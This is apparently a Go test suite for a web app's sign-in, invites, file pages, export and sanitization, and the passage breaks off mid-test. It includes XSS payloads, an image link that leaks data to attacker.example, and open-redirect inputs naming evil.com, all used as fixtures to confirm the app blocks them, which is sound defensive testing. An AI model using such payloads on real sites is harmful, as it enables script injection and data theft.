package web

import (
	"archive/zip"
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/url"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/CoolJuice48/etherchat/go/adapters/auth"
	"github.com/CoolJuice48/etherchat/go/adapters/blobs"
	"github.com/CoolJuice48/etherchat/go/adapters/mail"
	"github.com/CoolJuice48/etherchat/go/adapters/store"
	"github.com/CoolJuice48/etherchat/go/core/ether"
	"github.com/CoolJuice48/etherchat/go/run/config"
)

type captureMailer struct {
	mu   sync.Mutex
	sent []mail.Message
}

func (c *captureMailer) Send(_ context.Context, m mail.Message) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.sent = append(c.sent, m)
	return nil
}

func (c *captureMailer) count() int {
	c.mu.Lock()
	defer c.mu.Unlock()
	return len(c.sent)
}

var codeRE = regexp.MustCompile(`\b(\d{6})\b`)

func (c *captureMailer) lastCode(t *testing.T) string {
	t.Helper()
	c.mu.Lock()
	defer c.mu.Unlock()
	if len(c.sent) == 0 {
		t.Fatal("no email sent")
	}
	m := codeRE.FindStringSubmatch(c.sent[len(c.sent)-1].Text)
	if m == nil {
		t.Fatalf("no code in %q", c.sent[len(c.sent)-1].Text)
	}
	return m[1]
}

type site struct {
	t      *testing.T
	ctx    context.Context
	srv    *httptest.Server
	ethers *ether.Service
	auth   *auth.Service
	mail   *captureMailer
	clock  time.Time
}

func newSite(t *testing.T) *site {
	t.Helper()
	ctx := context.Background()
	dir := t.TempDir()
	db, err := store.Open(ctx, filepath.Join(dir, "t.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { db.Close() })
	bs, err := blobs.Open(filepath.Join(dir, "blobs"))
	if err != nil {
		t.Fatal(err)
	}
	pepper := []byte(strings.Repeat("p", 32))
	s := &site{t: t, ctx: ctx, mail: &captureMailer{}, clock: time.Now()}
	s.ethers = ether.New(db, bs, config.DefaultLimits(), pepper)
	log := slog.New(slog.NewTextHandler(io.Discard, nil))
	s.auth = auth.New(db, s.ethers, s.mail, pepper, log)
	s.auth.SetClock(func() time.Time { return s.clock })
	h, err := New(Config{Ethers: s.ethers, Auth: s.auth, Mailer: s.mail, BaseURL: "https://etherchat.test", Log: log})
	if err != nil {
		t.Fatal(err)
	}
	s.srv = httptest.NewServer(h)
	t.Cleanup(s.srv.Close)
	return s
}

// browser keeps cookies by hand: the session cookie is Secure, and Go's
// cookie jar won't send Secure cookies over the test server's plain HTTP.
type browser struct {
	s       *site
	cookies map[string]string
}

func (s *site) browser() *browser { return &browser{s: s, cookies: map[string]string{}} }

func (b *browser) do(method, path string, form url.Values, headers map[string]string) *http.Response {
	b.s.t.Helper()
	var body io.Reader
	if form != nil {
		body = strings.NewReader(form.Encode())
	}
	req, _ := http.NewRequest(method, b.s.srv.URL+path, body)
	if form != nil {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	for k, v := range b.cookies {
		req.AddCookie(&http.Cookie{Name: k, Value: v})
	}
	client := &http.Client{CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	resp, err := client.Do(req)
	if err != nil {
		b.s.t.Fatal(err)
	}
	for _, c := range resp.Cookies() {
		if c.MaxAge < 0 {
			delete(b.cookies, c.Name)
		} else {
			b.cookies[c.Name] = c.Value
		}
	}
	return resp
}

func readBody(t *testing.T, resp *http.Response) string {
	t.Helper()
	b, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// account allowlists email and returns a signed-in browser for it.
func (s *site) signedIn(email string) (*browser, *ether.Account) {
	s.t.Helper()
	if err := s.ethers.Allow(s.ctx, email, ""); err != nil {
		s.t.Fatal(err)
	}
	acct, err := s.ethers.EnsureAccount(s.ctx, email, true)
	if err != nil {
		s.t.Fatal(err)
	}
	token, _, err := s.auth.NewSession(s.ctx, acct.ID)
	if err != nil {
		s.t.Fatal(err)
	}
	b := s.browser()
	b.cookies[SessionCookie] = token
	return b, acct
}

func TestSignInFlow(t *testing.T) {
	s := newSite(t)
	if err := s.ethers.Allow(s.ctx, "alice@example.com", ""); err != nil {
		t.Fatal(err)
	}
	b := s.browser()

	resp := b.do("GET", "/e/abc", nil, nil)
	if resp.StatusCode != http.StatusSeeOther || !strings.HasPrefix(resp.Header.Get("Location"), "/login?next=") {
		t.Fatalf("signed-out page: %d %s", resp.StatusCode, resp.Header.Get("Location"))
	}

	resp = b.do("POST", "/login", url.Values{"email": {"Alice@Example.com"}, "next": {"/e/abc"}}, nil)
	page := readBody(t, resp)
	if resp.StatusCode != 200 || !strings.Contains(page, "Check your email") || s.mail.count() != 1 {
		t.Fatalf("request code: %d, %d emails", resp.StatusCode, s.mail.count())
	}
	if m := s.mail.sent[0]; m.To != "alice@example.com" || !strings.Contains(m.Text, "never asks for this code") ||
		!strings.Contains(m.HTML, "never asks for this code") {
		t.Fatalf("email: %+v", s.mail.sent[0])
	}
	code := s.mail.lastCode(t)

	resp = b.do("POST", "/login/verify", url.Values{"email": {"alice@example.com"}, "code": {code[:3] + " " + code[3:]}, "next": {"/e/abc"}}, nil)
	if resp.StatusCode != http.StatusSeeOther || resp.Header.Get("Location") != "/e/abc" {
		t.Fatalf("verify: %d %s", resp.StatusCode, resp.Header.Get("Location"))
	}
	var session *http.Cookie
	for _, c := range resp.Cookies() {
		if c.Name == SessionCookie {
			session = c
		}
	}
	if session == nil || !session.Secure || !session.HttpOnly || session.SameSite != http.SameSiteLaxMode || session.Path != "/" {
		t.Fatalf("session cookie: %+v", session)
	}
	if page := readBody(t, b.do("GET", "/", nil, nil)); !strings.Contains(page, "Your ethers") || !strings.Contains(page, "@alice") {
		t.Fatalf("home after sign-in:\n%s", page)
	}
	// A code works once.
	if resp := b.do("POST", "/login/verify", url.Values{"email": {"alice@example.com"}, "code": {code}}, nil); resp.StatusCode != http.StatusUnauthorized {
		t.Fatalf("reused code: %d", resp.StatusCode)
	}

	resp = b.do("POST", "/logout", url.Values{}, nil)
	if resp.StatusCode != http.StatusSeeOther {
		t.Fatalf("logout: %d", resp.StatusCode)
	}
	if page := readBody(t, b.do("GET", "/", nil, nil)); !strings.Contains(page, "Joining an ether") || strings.Contains(page, "Your ethers") {
		t.Fatalf("after logout, / should be the landing page:\n%s", page)
	}
}

func TestSignInDoesNotRevealAccounts(t *testing.T) {
	s := newSite(t)
	if err := s.ethers.Allow(s.ctx, "alice@example.com", ""); err != nil {
		t.Fatal(err)
	}
	known := readBody(t, s.browser().do("POST", "/login", url.Values{"email": {"alice@example.com"}}, nil))
	unknown := readBody(t, s.browser().do("POST", "/login", url.Values{"email": {"stranger@example.com"}}, nil))
	normalize := func(p string) string {
		return strings.NewReplacer("alice@example.com", "X", "stranger@example.com", "X").Replace(p)
	}
	if normalize(known) != normalize(unknown) {
		t.Fatal("the page differs for allowlisted and unknown emails")
	}
	if s.mail.count() != 1 {
		t.Fatalf("%d emails sent, want 1 (none to the stranger)", s.mail.count())
	}
	if resp := s.browser().do("POST", "/login", url.Values{"email": {"not an email"}}, nil); resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("malformed email: %d", resp.StatusCode)
	}
}

func TestCodeLimits(t *testing.T) {
	s := newSite(t)
	if err := s.ethers.Allow(s.ctx, "alice@example.com", ""); err != nil {
		t.Fatal(err)
	}
	b := s.browser()
	verify := func(code string) int {
		return b.do("POST", "/login/verify", url.Values{"email": {"alice@example.com"}, "code": {code}}, nil).StatusCode
	}
	wrong := func(code string) string {
		if code == "000000" {
			return "000001"
		}
		return "000000"
	}

	// Five wrong guesses lock the code, even the right one fails after.
	b.do("POST", "/login", url.Values{"email": {"alice@example.com"}}, nil)
	code := s.mail.lastCode(t)
	for i := 0; i < auth.MaxAttempts; i++ {
		if got := verify(wrong(code)); got != http.StatusUnauthorized {
			t.Fatalf("wrong guess %d: %d", i, got)
		}
	}
	if got := verify(code); got != http.StatusUnauthorized {
		t.Fatalf("correct code after lockout: %d", got)
	}

	// Codes expire after 10 minutes.
	b.do("POST", "/login", url.Values{"email": {"alice@example.com"}}, nil)
	code = s.mail.lastCode(t)
	s.clock = s.clock.Add(11 * time.Minute)
	if got := verify(code); got != http.StatusUnauthorized {
		t.Fatalf("expired code: %d", got)
	}

	// A new code supersedes the previous one.
	b.do("POST", "/login", url.Values{"email": {"alice@example.com"}}, nil)
	first := s.mail.lastCode(t)
	b.do("POST", "/login", url.Values{"email": {"alice@example.com"}}, nil)
	second := s.mail.lastCode(t)
	if first != second {
		if got := verify(first); got != http.StatusUnauthorized {
			t.Fatalf("superseded code: %d", got)
		}
	}

	// At most five codes per email per hour; further requests send nothing.
	s.clock = s.clock.Add(2 * time.Hour)
	before := s.mail.count()
	for i := 0; i < auth.CodesPerEmailPerHour+2; i++ {
		b.do("POST", "/login", url.Values{"email": {"alice@example.com"}}, nil)
	}
	if sent := s.mail.count() - before; sent != auth.CodesPerEmailPerHour {
		t.Fatalf("%d codes sent in an hour, want %d", sent, auth.CodesPerEmailPerHour)
	}
}

func TestDisabledAccountLosesSession(t *testing.T) {
	s := newSite(t)
	b, _ := s.signedIn("alice@example.com")
	if resp := b.do("GET", "/", nil, nil); resp.StatusCode != 200 {
		t.Fatalf("signed in: %d", resp.StatusCode)
	}
	if err := s.ethers.Disallow(s.ctx, "alice@example.com"); err != nil {
		t.Fatal(err)
	}
	if page := readBody(t, b.do("GET", "/", nil, nil)); strings.Contains(page, "Your ethers") {
		t.Fatal("disabled account still signed in")
	}
}

const hostile = `# Plan

<script>alert(1)</script>
<img src=x onerror=alert(2)>

[click](javascript:alert(3)) and [docs](https://example.com/docs) and [sibling](other.md)

![tracker](https://attacker.example/leak.png?d=secret)
`

func TestEtherPages(t *testing.T) {
	s := newSite(t)
	alice, acct := s.signedIn("alice@example.com")
	a := ether.Actor{AccountID: acct.ID, ClientID: "test"}
	e, err := s.ethers.CreateEther(s.ctx, a, "Atlas <b>2026</b>")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := s.ethers.WriteFile(s.ctx, a, e.ID, "shared/plan.md", []byte(hostile), 0, nil); err != nil {
		t.Fatal(err)
	}
	if _, err := s.ethers.WriteFile(s.ctx, a, e.ID, "shared/plan.md", []byte(hostile+"\nv2"), 1, nil); err != nil {
		t.Fatal(err)
	}
	if _, err := s.ethers.WriteFile(s.ctx, a, e.ID, "members/alice/Week 1 notes.txt", []byte("<b>not bold</b>"), 0, nil); err != nil {
		t.Fatal(err)
	}
	if _, err := s.ethers.PostMessage(s.ctx, a, e.ID, ether.PostInput{Intent: ether.IntentUpdate, Title: "Kickoff", Body: "Hello <script>x</script> **team**"}); err != nil {
		t.Fatal(err)
	}

	// Overview: tabs, agents, and the activity feed.
	resp := alice.do("GET", "/e/"+e.ID, nil, nil)
	page := readBody(t, resp)
	for _, want := range []string{">Overview<", ">Comms<", ">Shared files<", ">@alice<", `aria-current="page">Overview`,
		"wrote v2 of", "shared/plan.md", "Week 1 notes.txt", "Kickoff", "via test"} {
		if !strings.Contains(page, want) {
			t.Errorf("overview is missing %q", want)
		}
	}
	if resp.StatusCode != 200 || strings.Contains(page, "<script>") || strings.Contains(page, "<b>2026</b>") {
		t.Fatalf("overview (%d):\n%s", resp.StatusCode, page)
	}

	// Comms: rendered, sanitized posts.
	page = readBody(t, alice.do("GET", "/e/"+e.ID+"/comms", nil, nil))
	if !strings.Contains(page, "<strong>team</strong>") || strings.Contains(page, "<script>") || !strings.Contains(page, `aria-current="page">Comms`) {
		t.Fatalf("comms:\n%s", page)
	}

	// Shared files: only shared/.
	page = readBody(t, alice.do("GET", "/e/"+e.ID+"/shared", nil, nil))
	if !strings.Contains(page, "plan.md") || strings.Contains(page, "Week 1 notes.txt") {
		t.Fatalf("shared tab:\n%s", page)
	}

	// An agent's tab: their workspace and their activity.
	page = readBody(t, alice.do("GET", "/e/"+e.ID+"/m/alice", nil, nil))
	if !strings.Contains(page, "Week 1 notes.txt") || strings.Contains(page, `href="/e/`+e.ID+`/f/shared/plan.md">plan.md`) ||
		!strings.Contains(page, `aria-current="page">@alice`) || !strings.Contains(page, "members/alice/") {
		t.Fatalf("agent tab:\n%s", page)
	}
	if resp := alice.do("GET", "/e/"+e.ID+"/m/nobody", nil, nil); resp.StatusCode != http.StatusNotFound {
		t.Fatalf("unknown agent tab: %d", resp.StatusCode)
	}
	if csp := resp.Header.Get("Content-Security-Policy"); !strings.Contains(csp, "img-src 'self'") || !strings.Contains(csp, "default-src 'none'") {
		t.Fatalf("CSP = %q", csp)
	}

	page = readBody(t, alice.do("GET", "/e/"+e.ID+"/f/shared/plan.md", nil, nil))
	for _, bad := range []string{"<script>", "onerror", "javascript:"} {
		if strings.Contains(page, bad) {
			t.Errorf("file page contains %q", bad)
		}
	}
	if !strings.Contains(page, `href="https://example.com/docs" rel="noopener noreferrer nofollow"`) ||
		!strings.Contains(page, `<span class="url">(https://example.com/docs)</span>`) {
		t.Errorf("external link not marked:\n%s", page)
	}
	if !strings.Contains(page, `href="other.md"`) {
		t.Errorf("relative link changed")
	}

	page = readBody(t, alice.do("GET", "/e/"+e.ID+"/f/shared/plan.md?v=1", nil, nil))
	if !strings.Contains(page, "viewing version 1") {
		t.Errorf("old version banner missing")
	}

	resp = alice.do("GET", "/e/"+e.ID+"/f/members/alice/Week%201%20notes.txt?raw=1", nil, nil)
	if body := readBody(t, resp); body != "<b>not bold</b>" || resp.Header.Get("Content-Type") != "text/plain; charset=utf-8" ||
		!strings.Contains(resp.Header.Get("Content-Security-Policy"), "sandbox") {
		t.Fatalf("raw: %q %v", body, resp.Header)
	}
	resp = alice.do("GET", "/e/"+e.ID+"/d/members/alice/Week%201%20notes.txt", nil, nil)
	readBody(t, resp)
	if cd := resp.Header.Get("Content-Disposition"); !strings.HasPrefix(cd, "attachment") || !strings.Contains(cd, "Week 1 notes.txt") {
		t.Fatalf("download disposition = %q", cd)
	}

	page = readBody(t, alice.do("GET", "/e/"+e.ID+"/h/shared/plan.md", nil, nil))
	if !strings.Contains(page, "?v=1") || !strings.Contains(page, "?v=2") {
		t.Fatalf("history page:\n%s", page)
	}
	if resp := alice.do("GET", "/e/"+e.ID+"/f/shared", nil, nil); resp.StatusCode != http.StatusSeeOther {
		t.Fatalf("folder path: %d", resp.StatusCode)
	}

	// Another signed-in person who isn't a member gets 404 everywhere.
	bob, _ := s.signedIn("bob@example.com")
	for _, p := range []string{"/e/" + e.ID, "/e/" + e.ID + "/comms", "/e/" + e.ID + "/shared", "/e/" + e.ID + "/m/alice",
		"/e/" + e.ID + "/f/shared/plan.md", "/e/" + e.ID + "/export.zip", "/e/" + e.ID + "/h/shared/plan.md"} {
		if resp := bob.do("GET", p, nil, nil); resp.StatusCode != http.StatusNotFound {
			t.Errorf("non-member GET %s: %d", p, resp.StatusCode)
		}
	}
}

func TestExportZip(t *testing.T) {
	s := newSite(t)
	alice, acct := s.signedIn("alice@example.com")
	a := ether.Actor{AccountID: acct.ID, ClientID: "test"}
	e, err := s.ethers.CreateEther(s.ctx, a, "Atlas/2026")
	if err != nil {
		t.Fatal(err)
	}
	files := map[string]string{
		"shared/plan.md":              "# Plan\nship it",
		"members/alice/notes/day1.md": "day one",
	}
	for p, c := range files {
		if _, err := s.ethers.WriteFile(s.ctx, a, e.ID, p, []byte(c), 0, nil); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := s.ethers.PostMessage(s.ctx, a, e.ID, ether.PostInput{Intent: ether.IntentHandoff, Title: "Handoff", Body: "Over to you."}); err != nil {
		t.Fatal(err)
	}

	resp := alice.do("GET", "/e/"+e.ID+"/export.zip", nil, nil)
	body := readBody(t, resp)
	if resp.StatusCode != 200 || resp.Header.Get("Content-Type") != "application/zip" ||
		!strings.Contains(resp.Header.Get("Content-Disposition"), "Atlas-2026.zip") {
		t.Fatalf("export: %d %v", resp.StatusCode, resp.Header)
	}
	zr, err := zip.NewReader(bytes.NewReader([]byte(body)), int64(len(body)))
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]string{}
	for _, f := range zr.File {
		if !strings.HasPrefix(f.Name, "Atlas-2026/") || strings.Contains(f.Name, "..") {
			t.Fatalf("bad entry name %q", f.Name)
		}
		if strings.HasSuffix(f.Name, "/") {
			continue
		}
		rc, _ := f.Open()
		b, _ := io.ReadAll(rc)
		rc.Close()
		got[strings.TrimPrefix(f.Name, "Atlas-2026/")] = string(b)
	}
	for p, c := range files {
		if got[p] != c {
			t.Errorf("%s = %q, want %q", p, got[p], c)
		}
	}
	if !strings.Contains(got["board.md"], "Handoff") || !strings.Contains(got["board.md"], "Over to you.") {
		t.Errorf("board.md = %q", got["board.md"])
	}
	var m manifest
	if err := json.Unmarshal([]byte(got["manifest.json"]), &m); err != nil {
		t.Fatal(err)
	}
	if len(m.Files) != len(files) || m.Owner != "@alice" {
		t.Fatalf("manifest = %+v", m)
	}
	for _, f := range m.Files {
		sum := sha256.Sum256([]byte(files[f.Path]))
		if f.SHA256 != hex.EncodeToString(sum[:]) || f.Author != "@alice" || f.Version != 1 {
			t.Errorf("manifest entry %+v", f)
		}
	}
}

func TestCrossSitePostsRejected(t *testing.T) {
	s := newSite(t)
	b, _ := s.signedIn("alice@example.com")
	resp := b.do("POST", "/logout", url.Values{}, map[string]string{"Sec-Fetch-Site": "cross-site"})
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("cross-site POST: %d", resp.StatusCode)
	}
	if resp := b.do("GET", "/", nil, nil); resp.StatusCode != 200 {
		t.Fatalf("session should survive a rejected cross-site logout: %d", resp.StatusCode)
	}
}

func TestSafeNext(t *testing.T) {
	for in, want := range map[string]string{
		"/e/abc":            "/e/abc",
		"":                  "/",
		"https://evil.com":  "/",
		"//evil.com/x":      "/",
		"/\\evil.com":       "/",
		"/e/abc?v=2#frag":   "/e/abc?v=2#frag",
		"javascript:alert1": "/",
	} {
		if got := safeNext(in); got != want {
			t.Errorf("safeNext(%q) = %q, want %q", in, got, want)
		}
	}
}

// TestHandleChange: the handle can be picked when creating a first ether,
// and a bad one stops the form before anything is created.
func TestHandleChange(t *testing.T) {
	s := newSite(t)
	b, acct := s.signedIn("alice.smith@example.com")
	origin := map[string]string{"Origin": s.srv.URL}
	if page := readBody(t, b.do("GET", "/new", nil, nil)); !strings.Contains(page, `name="handle" value="alice.smith"`) ||
		!strings.Contains(page, `placeholder="my new ether"`) {
		t.Fatalf("new ether page:\n%s", page)
	}
	if resp := b.do("POST", "/ethers", url.Values{"name": {"Notes"}, "handle": {"Not Valid"}}, origin); resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("invalid handle: %d", resp.StatusCode)
	}
	if list, _ := s.ethers.ListAllEthers(s.ctx); len(list) != 0 {
		t.Fatal("ether created despite a bad handle")
	}
	if resp := b.do("POST", "/ethers", url.Values{"name": {"Notes"}, "handle": {"@asmith"}}, origin); resp.StatusCode != http.StatusSeeOther {
		t.Fatalf("create with handle: %d", resp.StatusCode)
	}
	if a, _ := s.ethers.AccountByID(s.ctx, acct.ID); a.Handle != "asmith" {
		t.Fatalf("handle = %q", a.Handle)
	}
	// After the first ether, the handle is fixed and the field is gone.
	if page := readBody(t, b.do("GET", "/new", nil, nil)); strings.Contains(page, `name="handle"`) {
		t.Fatal("handle field offered after the first ether")
	}
}

// TestActivityHidesScheduledPosts: a post scheduled for later doesn't show
// up in the activity feed (or its title on the overview) until it publishes.
func TestActivityHidesScheduledPosts(t *testing.T) {
	s := newSite(t)
	alice, acct := s.signedIn("alice@example.com")
	a := ether.Actor{AccountID: acct.ID, ClientID: "test"}
	e, err := s.ethers.CreateEther(s.ctx, a, "Team")
	if err != nil {
		t.Fatal(err)
	}
	later := time.Now().Add(2 * time.Hour)
	if _, err := s.ethers.PostMessage(s.ctx, a, e.ID, ether.PostInput{Intent: ether.IntentUpdate, Title: "Secret plan", Body: "x", SendAt: &later}); err != nil {
		t.Fatal(err)
	}
	if page := readBody(t, alice.do("GET", "/e/"+e.ID, nil, nil)); strings.Contains(page, "Secret plan") {
		t.Fatal("scheduled post's title is visible before it publishes")
	}
}

var inviteLinkRE = regexp.MustCompile(`https://etherchat\.test/invite/([A-Z0-9-]+)`)

// lastInviteCode returns the code from the newest invite email to addr.
func (c *captureMailer) lastInviteCode(t *testing.T, addr string) string {
	t.Helper()
	c.mu.Lock()
	defer c.mu.Unlock()
	for i := len(c.sent) - 1; i >= 0; i-- {
		if m := c.sent[i]; m.To == addr {
			match := inviteLinkRE.FindStringSubmatch(m.Text)
			if match == nil || !strings.Contains(m.HTML, match[0]) {
				t.Fatalf("no invite link in both parts of %+v", m)
			}
			return match[1]
		}
	}
	t.Fatalf("no email to %s", addr)
	return ""
}

func TestCreateEtherAndInvite(t *testing.T) {
	s := newSite(t)
	owner, _ := s.signedIn("owner@example.com")
	origin := map[string]string{"Origin": s.srv.URL}

	// An address that isn't allowlisted stops the form before anything exists.
	resp := owner.do("POST", "/ethers", url.Values{"name": {"Atlas"}, "email": {"sam@example.com", ""}}, origin)
	page := readBody(t, resp)
	if resp.StatusCode != 400 || !strings.Contains(page, "That address can&#39;t be invited here: sam@example.com. Ask the server&#39;s admin.") ||
		strings.Contains(page, "allowlist") || strings.Contains(page, "/allow-requests") || !strings.Contains(page, `value="Atlas"`) {
		t.Fatalf("non-allowlisted invitee: %d\n%s", resp.StatusCode, page)
	}
	if list, _ := s.ethers.ListAllEthers(s.ctx); len(list) != 0 {
		t.Fatalf("ether created despite the error: %+v", list)
	}

	if err := s.ethers.Allow(s.ctx, "sam@example.com", ""); err != nil {
		t.Fatal(err)
	}
	resp = owner.do("POST", "/ethers", url.Values{"name": {"Atlas"}, "email": {"Sam@Example.com", "", ""}}, origin)
	loc := resp.Header.Get("Location")
	if resp.StatusCode != http.StatusSeeOther || !strings.HasSuffix(loc, "?n=created") {
		t.Fatalf("create: %d %s", resp.StatusCode, loc)
	}
	etherPath := strings.TrimSuffix(loc, "?n=created")
	page = readBody(t, owner.do("GET", loc, nil, nil))
	for _, want := range []string{"The invites are on their way.", "sam@example.com", "Connect your AI", "https://etherchat.test/mcp", "withdraw"} {
		if !strings.Contains(page, want) {
			t.Fatalf("overview after create is missing %q:\n%s", want, page)
		}
	}
	code := s.mail.lastInviteCode(t, "sam@example.com")
	if sub := s.mail.sent[len(s.mail.sent)-1].Subject; sub != `owner@example.com invited you to "Atlas" on Etherchat` {
		t.Fatalf("subject: %q", sub)
	}

	// Signed out, the link goes through sign-in and comes back.
	resp = s.browser().do("GET", "/invite/"+code, nil, nil)
	if resp.StatusCode != http.StatusSeeOther || resp.Header.Get("Location") != "/login?next="+url.QueryEscape("/invite/"+code) {
		t.Fatalf("signed-out invite: %d %s", resp.StatusCode, resp.Header.Get("Location"))
	}

	// Someone else signed in sees nothing about the invite.
	other, _ := s.signedIn("other@example.com")
	page = readBody(t, other.do("GET", "/invite/"+code, nil, nil))
	if !strings.Contains(page, "can't be used") || strings.Contains(page, "Atlas") || strings.Contains(page, "owner@example.com") {
		t.Fatalf("wrong account sees the invite:\n%s", page)
	}
	if resp := other.do("POST", "/invite/"+code, url.Values{"decision": {"accept"}}, origin); resp.StatusCode != 404 {
		t.Fatalf("wrong account accepting: %d", resp.StatusCode)
	}

	// The invitee can look as often as they like (so can a mail scanner);
	// only the button uses the invite.
	sam, samAcct := s.signedIn("sam@example.com")
	for range 2 {
		page = readBody(t, sam.do("GET", "/invite/"+code, nil, nil))
		if !strings.Contains(page, "owner@example.com invited you to their ether [Atlas].") || !strings.Contains(page, `name="handle"`) {
			t.Fatalf("invite page:\n%s", page)
		}
	}
	resp = sam.do("POST", "/invite/"+code, url.Values{"decision": {"accept"}, "handle": {"samuel"}}, origin)
	if resp.StatusCode != http.StatusSeeOther || resp.Header.Get("Location") != etherPath+"?n=joined" {
		t.Fatalf("accept: %d %s", resp.StatusCode, resp.Header.Get("Location"))
	}
	if acct, _ := s.ethers.AccountByID(s.ctx, samAcct.ID); acct.Handle != "samuel" {
		t.Fatalf("handle after accepting: %q", acct.Handle)
	}
	page = readBody(t, sam.do("GET", etherPath+"?n=joined", nil, nil))
	if !strings.Contains(page, "You&#39;re in.") || !strings.Contains(page, "@samuel") || strings.Contains(page, "withdraw") {
		t.Fatalf("invitee's overview:\n%s", page)
	}
	page = readBody(t, sam.do("GET", "/invite/"+code, nil, nil))
	if !strings.Contains(page, "can't be used") {
		t.Fatal("a used invite still shows")
	}

	// Only fixed notices appear, whatever the link says.
	page = readBody(t, sam.do("GET", etherPath+"?n=<b>hi</b>", nil, nil))
	if strings.Contains(page, "hi</b>") || strings.Contains(page, "&lt;b&gt;") {
		t.Fatal("arbitrary notice text shown")
	}

	// Members can invite; only the owner withdraws invites and removes people.
	if err := s.ethers.Allow(s.ctx, "kim@example.com", ""); err != nil {
		t.Fatal(err)
	}
	resp = sam.do("POST", etherPath+"/invites", url.Values{"email": {"kim@example.com"}}, origin)
	if resp.StatusCode != http.StatusSeeOther || !strings.HasSuffix(resp.Header.Get("Location"), "?n=invited") {
		t.Fatalf("member invites: %d", resp.StatusCode)
	}
	kimCode := s.mail.lastInviteCode(t, "kim@example.com")
	if resp := sam.do("POST", etherPath+"/members/owner/remove", url.Values{}, origin); resp.StatusCode != http.StatusForbidden {
		t.Fatalf("member removing the owner: %d", resp.StatusCode)
	}
	invites, _ := s.ethers.ListInvites(s.ctx, ether.Actor{AccountID: samAcct.ID}, strings.TrimPrefix(etherPath, "/e/"))
	if len(invites) != 1 {
		t.Fatalf("pending invites: %+v", invites)
	}
	if resp := sam.do("POST", etherPath+"/invites/"+invites[0].ID+"/revoke", url.Values{}, origin); resp.StatusCode != http.StatusForbidden {
		t.Fatalf("member withdrawing an invite: %d", resp.StatusCode)
	}
	if resp := owner.do("POST", etherPath+"/invites/"+invites[0].ID+"/revoke", url.Values{}, origin); resp.StatusCode != http.StatusSeeOther {
		t.Fatalf("owner withdrawing an invite: %d", resp.StatusCode)
	}
	kim, _ := s.signedIn("kim@example.com")
	if page := readBody(t, kim.do("GET", "/invite/"+kimCode, nil, nil)); !strings.Contains(page, "can't be used") {
		t.Fatal("a withdrawn invite still shows")
	}
	if resp := owner.do("POST", etherPath+"/members/samuel/remove", url.Values{}, origin); resp.StatusCode != http.StatusSeeOther {
		t.Fatalf("owner removing a member: %d", resp.StatusCode)
	}
	if resp := sam.do("GET", etherPath, nil, nil); resp.StatusCode != 404 {
		t.Fatalf("removed member still sees the ether: %d", resp.StatusCode)
	}
}

func TestDeclineInvite(t *testing.T) {
	s := newSite(t)
	owner, ownerAcct := s.signedIn("owner@example.com")
	if err := s.ethers.Allow(s.ctx, "sam@example.com", ""); err != nil {
		t.Fatal(err)
	}
	origin := map[string]string{"Origin": s.srv.URL}
	owner.do("POST", "/ethers", url.Values{"name": {"Side project"}, "email": {"sam@example.com"}}, origin)
	code := s.mail.lastInviteCode(t, "sam@example.com")

	sam, _ := s.signedIn("sam@example.com")
	if page := readBody(t, sam.do("GET", "/", nil, nil)); !strings.Contains(page, "Waiting for you") || !strings.Contains(page, "owner@example.com") {
		t.Fatalf("home doesn't show the pending invite:\n%s", page)
	}
	resp := sam.do("POST", "/invite/"+code, url.Values{"decision": {"decline"}}, origin)
	if resp.StatusCode != http.StatusSeeOther || resp.Header.Get("Location") != "/?n=declined" {
		t.Fatalf("decline: %d %s", resp.StatusCode, resp.Header.Get("Location"))
	}
	if page := readBody(t, sam.do("GET", "/?n=declined", nil, nil)); !strings.Contains(page, "Invite declined.") || strings.Contains(page, "Waiting for you") {
		t.Fatalf("home after declining:\n%s", page)
	}
	if resp := sam.do("POST", "/invite/"+code, url.Values{"decision": {"accept"}}, origin); resp.StatusCode != 404 {
		t.Fatalf("accepting a declined invite: %d", resp.StatusCode)
	}
	list, _ := s.ethers.ListEthers(s.ctx, ether.Actor{AccountID: ownerAcct.ID})
	if len(list) != 1 || len(list[0].Members) != 1 {
		t.Fatalf("ether after declining: %+v", list)
	}
}

func TestDirectoryStats(t *testing.T) {
	s := newSite(t)
	b, acct := s.signedIn("alice@example.com")
	a := ether.Actor{AccountID: acct.ID, ClientID: "test"}
	e, err := s.ethers.CreateEther(s.ctx, a, "Team")
	if err != nil {
		t.Fatal(err)
	}
	for i, content := range []string{strings.Repeat("x", 4000), strings.Repeat("y", 1500)} {
		// The second write replaces the first; only the current version counts.
		if _, err := s.ethers.WriteFile(s.ctx, a, e.ID, "shared/a.md", []byte(content), int64(i), nil); err != nil {
			t.Fatal(err)
		}
	}
	for _, title := range []string{"one", "two"} {
		if _, err := s.ethers.PostMessage(s.ctx, a, e.ID, ether.PostInput{Intent: ether.IntentUpdate, Title: title, Body: "x"}); err != nil {
			t.Fatal(err)
		}
	}
	page := readBody(t, b.do("GET", "/", nil, nil))
	if !strings.Contains(page, "1.5 KB · 2 agent interactions") || !strings.Contains(page, `href="/new"`) {
		t.Fatalf("directory:\n%s", page)
	}
}

func TestAnswerRequest(t *testing.T) {
	s := newSite(t)
	owner, ownerAcct := s.signedIn("owner@example.com")
	sam, samAcct := s.signedIn("sam@example.com")
	origin := map[string]string{"Origin": s.srv.URL}
	app := ether.Actor{AccountID: ownerAcct.ID, ClientID: "chatgpt"}
	e, err := s.ethers.CreateEther(s.ctx, app, "Atlas")
	if err != nil {
		t.Fatal(err)
	}
	code, _, _ := s.ethers.CreateInvite(s.ctx, app, e.ID, "sam@example.com")
	if _, err := s.ethers.JoinWithCode(s.ctx, ether.Actor{AccountID: samAcct.ID}, code); err != nil {
		t.Fatal(err)
	}
